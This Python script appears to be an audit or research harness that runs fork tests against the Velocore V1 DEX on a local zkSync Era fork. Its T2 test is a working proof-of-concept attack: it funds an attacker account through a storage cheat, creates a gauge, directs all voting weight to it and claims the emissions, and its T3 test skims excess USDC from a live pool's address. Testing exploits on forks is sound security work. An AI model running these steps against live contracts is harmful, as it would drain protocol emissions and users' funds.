#!/usr/bin/env python3
"""Velocore V1 (zkSync Era) fork tests — driven against a local anvil-zksync fork.
Read-only on mainnet: all transactions go to the local fork only.
Usage: python3 fork_test.py <T1|T2|T3> <out.json>
"""
import json, subprocess, sys, time, urllib.request

FORK = "http://127.0.0.1:8011"
VC = "0x85D84c774CF8e9fF85342684b0E795Df72A24908"
ESC = "0xbdE345771Eb0c6adEBc54F41A169ff6311fE096F"
VOTER = "0xe09A60FAe6d77658b9767A70e2f361b46Dd3f16A"
FACTORY = "0xE140EaC2bB748c8F456719a457F26636617Bb0E9"
GAUGE_USDCWETH = "0xb3120Ad6C3285fc4E422581d9ad003277802CC47"
POOL_USDCWETH = "0xcD52cbc975fbB802F82A1F92112b1250b5a997Df"
USDC = "0x3355df6D4c9C3035724Fd0e3914dE96A5a83aaf4"
ZKDOGE = "0xbfb4b5616044eded03e5b1ad75141f0d9cb1499b"
A = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
PK = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

def rpc(method, params):
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    req = urllib.request.Request(FORK, data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read()).get("result")

def call(to, sig, *args, retries=8):
    for i in range(retries):
        p = subprocess.run(["cast", "call", to, sig, *[str(a) for a in args], "--rpc-url", FORK],
                           capture_output=True, text=True)
        if p.returncode == 0 and p.stdout.strip():
            return p.stdout.strip().split()[0]
        time.sleep(1)
    return None

def retry_read(to, sig, *args, expect=None, retries=15):
    for i in range(retries):
        v = call(to, sig, *args, retries=1)
        if v is not None and (expect is None or expect(v)):
            return v
        time.sleep(1)
    return v

def send(to, sig, *args, gas=20000000):
    p = subprocess.run(["cast", "send", to, sig, *[str(a) for a in args],
                        "--private-key", PK, "--gas-limit", str(gas), "--rpc-url", FORK],
                       capture_output=True, text=True)
    out = p.stdout
    ok = "status               1 (success)" in out
    return ("ok" if ok else "fail"), out.strip().splitlines()[-1] if out else p.stderr[:200]

def uint(v):
    return int(v, 16) if v and v.startswith("0x") else (int(v) if v and v.isdigit() else 0)

def test_T1():
    res = {}
    idx_b = call(VOTER, "index_placeholder()", retries=1)
    idx_b = rpc("eth_getStorageAt", [VOTER, hex(18), "latest"])
    g_b = uint(call(VC, "balanceOf(address)(uint256)", GAUGE_USDCWETH))
    v_b = uint(call(VC, "balanceOf(address)(uint256)", VOTER))
    st, _ = send(VOTER, "distribute(address[])", f"[{GAUGE_USDCWETH}]")
    idx_a = rpc("eth_getStorageAt", [VOTER, hex(18), "latest"])
    g_a = uint(call(VC, "balanceOf(address)(uint256)", GAUGE_USDCWETH))
    v_a = uint(call(VC, "balanceOf(address)(uint256)", VOTER))
    res["send"] = st
    res["index_before"] = uint(idx_b); res["index_after"] = uint(idx_a)
    res["gauge_vc_before"] = g_b; res["gauge_vc_after"] = g_a
    res["voter_vc_before"] = v_b; res["voter_vc_after"] = v_a
    res["gauge_received_vc"] = (g_a - g_b) / 1e18
    res["voter_received_vc"] = (v_a - v_b) / 1e18
    return res

def test_T2():
    res = {}
    # fund attacker with 5,000,000 VC (fork cheat; models capital acquisition)
    slot = subprocess.run(["cast", "index", "address", A, "1"], capture_output=True, text=True).stdout.strip()
    rpc("anvil_setStorageAt", [VC, slot, "0x" + hex(5000000 * 10**18)[2:].zfill(64)])
    res["attacker_vc"] = uint(call(VC, "balanceOf(address)(uint256)", A))
    send(VC, "approve(address,uint256)", ESC, 5000000 * 10**18, gas=1000000)
    st_lock, _ = send(ESC, "create_lock(uint256,uint256)", 5000000 * 10**18, 125000000, gas=3000000)
    res["create_lock"] = st_lock
    tid = call(ESC, "tokenOfOwnerByIndex(address,uint256)(uint256)", A, 0)
    res["veNFT_id"] = uint(tid)
    bal = call(ESC, "balanceOfNFT(uint256)(uint256)", tid)
    res["veNFT_balance"] = uint(bal)
    n_before = uint(call(FACTORY, "allPairsLength()(uint256)"))
    st_pair, _ = send(FACTORY, "createPair(address,address,bool)", USDC, ZKDOGE, "false")
    res["createPair"] = st_pair
    np_ = retry_read(FACTORY, "allPairs(uint256)(address)", n_before, expect=lambda v: int(v, 16) != 0)
    res["new_pool"] = np_
    st_g, _ = send(VOTER, "createGauge(address)", np_)
    res["createGauge"] = st_g
    ng = "0x0000000000000000000000000000000000000000"
    for attempt in range(3):
        ng = retry_read(VOTER, "gauges(address)(address)", np_, expect=lambda v: int(v, 16) != 0, retries=6)
        if int(ng, 16) != 0:
            break
        print(f"[driver] gauge not visible after createGauge attempt {attempt+1}, re-sending")
        send(VOTER, "createGauge(address)", np_)
    res["new_gauge"] = ng
    res["gauge_isAlive"] = call(VOTER, "isAlive(address)(bool)", ng) == "true"
    st_v, _ = send(VOTER, "vote(uint256,address[],uint256[])", tid, f"[{np_}]", f"[{bal}]")
    res["vote"] = st_v
    w = retry_read(VOTER, "weights(address)(uint256)", np_, expect=lambda v: int(v, 16) > 0)
    res["attacker_weight"] = uint(w)
    res["totalWeight"] = uint(call(VOTER, "totalWeight()(uint256)"))
    idx_b = rpc("eth_getStorageAt", [VOTER, hex(18), "latest"])
    g_b = uint(call(VC, "balanceOf(address)(uint256)", ng))
    st_d, _ = send(VOTER, "distribute(address[])", f"[{ng}]")
    idx_a = rpc("eth_getStorageAt", [VOTER, hex(18), "latest"])
    g_a = uint(call(VC, "balanceOf(address)(uint256)", ng))
    res["distribute"] = st_d
    res["index_before"] = uint(idx_b); res["index_after"] = uint(idx_a)
    res["gauge_vc_before"] = g_b; res["gauge_vc_after"] = g_a
    res["claimable_after"] = uint(call(VOTER, "claimable(address)(uint256)", ng))
    res["gauge_received_vc"] = (g_a - g_b) / 1e18

    # --- claim path: stake LP -> advance time -> getReward ---
    USDC_WHALE = POOL_USDCWETH
    ZKDOGE_WHALE = "0x042Ded90C26EEA4D860F8E3Bd363Cc4B17CAA00C"
    rpc("anvil_impersonateAccount", [USDC_WHALE])
    rpc("anvil_impersonateAccount", [ZKDOGE_WHALE])
    subprocess.run(["cast", "send", USDC, "transfer(address,uint256)", A, "500000000",
                    "--unlocked", "--from", USDC_WHALE, "--gas-limit", "500000", "--rpc-url", FORK],
                   capture_output=True, text=True)
    subprocess.run(["cast", "send", ZKDOGE, "transfer(address,uint256)", A, "500000000000000000000",
                    "--unlocked", "--from", ZKDOGE_WHALE, "--gas-limit", "500000", "--rpc-url", FORK],
                   capture_output=True, text=True)
    send(USDC, "approve(address,uint256)", np_, 500000000, gas=500000)
    send(ZKDOGE, "approve(address,uint256)", np_, 500000000000000000000, gas=500000)
    send(USDC, "transfer(address,uint256)", np_, 500000000, gas=500000)
    send(ZKDOGE, "transfer(address,uint256)", np_, 500000000000000000000, gas=500000)
    st_mint, _ = send(np_, "mint(address)", A, gas=5000000)
    res["mint_lp"] = st_mint
    lp = call(np_, "balanceOf(address)(uint256)", A)
    res["lp_minted"] = uint(lp)
    send(np_, "approve(address,uint256)", ng, lp, gas=500000)
    st_stake, _ = send(ng, "deposit(uint256,uint256)", lp, tid, gas=5000000)
    res["stake"] = st_stake
    res["staked_lp"] = uint(call(ng, "balanceOf(address)(uint256)", A))
    rpc("anvil_increaseTime", [259200])  # +3 days
    rpc("anvil_mine", [])
    res["earned_after_3d"] = uint(call(ng, "earned(address,address)(uint256)", A, VC))
    v_b2 = uint(call(VC, "balanceOf(address)(uint256)", A))
    st_claim, _ = send(ng, "getReward(address,address[])", A, f"[{VC}]", gas=5000000)
    v_a2 = uint(call(VC, "balanceOf(address)(uint256)", A))
    res["getReward"] = st_claim
    res["claimed_vc"] = (v_a2 - v_b2) / 1e18
    return res

def test_T3():
    res = {}
    b = uint(call(USDC, "balanceOf(address)(uint256)", POOL_USDCWETH))
    r = call(POOL_USDCWETH, "getReserves()(uint256,uint256,uint256)")
    r0 = int(r.split()[0]) if r else 0
    st, _ = send(POOL_USDCWETH, "skim(address)", A, gas=5000000)
    ba = uint(call(USDC, "balanceOf(address)(uint256)", POOL_USDCWETH))
    res.update({"send": st, "pool_usdc_balance": b, "reserve0": r0, "pool_usdc_after": ba,
                "excess_usdc": b - r0})
    return res

if __name__ == "__main__":
    which = sys.argv[1]
    out = sys.argv[2]
    block = uint(rpc("eth_blockNumber", []))
    fn = {"T1": test_T1, "T2": test_T2, "T3": test_T3}[which]
    res = fn()
    try:
        d = json.load(open(out))
    except Exception:
        d = {}
    d.setdefault("tests", {})[f"{which}"] = res
    d[f"fork_block_{which}"] = block
    d["rpc"] = "keyless public zkSync Era RPC"
    json.dump(d, open(out, "w"), indent=1)
    print(f"[driver] {which} @ block {block}: {json.dumps(res)}")
